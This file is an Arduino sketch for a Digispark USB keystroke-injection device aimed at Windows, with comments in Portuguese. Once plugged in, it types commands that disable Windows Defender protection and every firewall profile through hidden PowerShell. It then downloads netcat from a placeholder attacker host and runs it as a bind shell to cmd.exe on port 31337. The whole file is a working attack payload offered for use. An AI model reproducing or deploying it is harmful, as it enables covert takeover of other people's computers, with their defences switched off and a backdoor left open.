#include "DigiKeyboard.h"

void setup() {
  pinMode(1, HIGH);  //LED on Model A
}

void loop() {
  //Desliga o Windows Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //Abre o executar
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");  
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  //1 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  //1 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  //Abre o executar
  DigiKeyboard.delay(500);
  //Desabilita o Firewall
  DigiKeyboard.println("powershell start-process powershell -verb runas");  
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.println("powershell -windowstyle hidden Set-NetFirewallProfile -Enabled False");  //Desabilita o Firewall :)
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
  DigiKeyboard.delay(500);
  //Reverse shell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden Invoke-WebRequest -Uri http://YOURIP/nc.exe -OutFile test.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -windowstyle hidden ./test.exe -Lp 31337 -e cmd.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //
  digitalWrite(1, HIGH);  //turn on led when program finishes
  DigiKeyboard.delay(5000);
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }
}
